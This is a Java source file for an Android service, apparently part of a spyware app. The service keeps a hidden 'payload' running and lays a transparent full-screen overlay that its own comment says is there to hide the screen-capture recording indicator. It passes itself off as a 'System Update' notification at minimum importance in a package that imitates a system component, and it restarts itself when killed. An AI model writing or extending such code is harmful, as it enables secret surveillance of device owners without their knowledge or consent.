package com.android.shell.ghost;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.os.IBinder;
import android.provider.Settings;
import android.view.Gravity;
import android.view.WindowManager;

/**
 * Keeps the process alive and overlays a transparent window so the payload's
 * screen capture has no red recording indicator on top of it.
 */
public class GhostForegroundService extends Service {

    private WindowManager windowManager;
    private android.view.View overlayView;

    @Override
    public void onCreate() {
        super.onCreate();
        windowManager = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        startForeground(1, createNotification());

        overlayView = new android.view.View(this);
        overlayView.setBackgroundColor(0x00000000);
        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                        | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                        | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                PixelFormat.TRANSPARENT);
        params.gravity = Gravity.TOP | Gravity.START;
        try {
            if (Settings.canDrawOverlays(this)) windowManager.addView(overlayView, params);
        } catch (Throwable ignored) {}
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        if (overlayView != null) {
            try { windowManager.removeView(overlayView); } catch (Throwable ignored) {}
            overlayView = null;
        }
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    private Notification createNotification() {
        NotificationChannel channel = new NotificationChannel(
                "ghost_service", "System Update", NotificationManager.IMPORTANCE_MIN);
        ((NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE))
                .createNotificationChannel(channel);
        Intent open = new Intent(this, MainActivity.class)
                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        PendingIntent content = PendingIntent.getActivity(this, 0, open,
                PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT);
        return new Notification.Builder(this, "ghost_service")
                .setContentTitle("System Update")
                .setContentText("Running")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setContentIntent(content)
                .setOngoing(true)
                .build();
    }
}
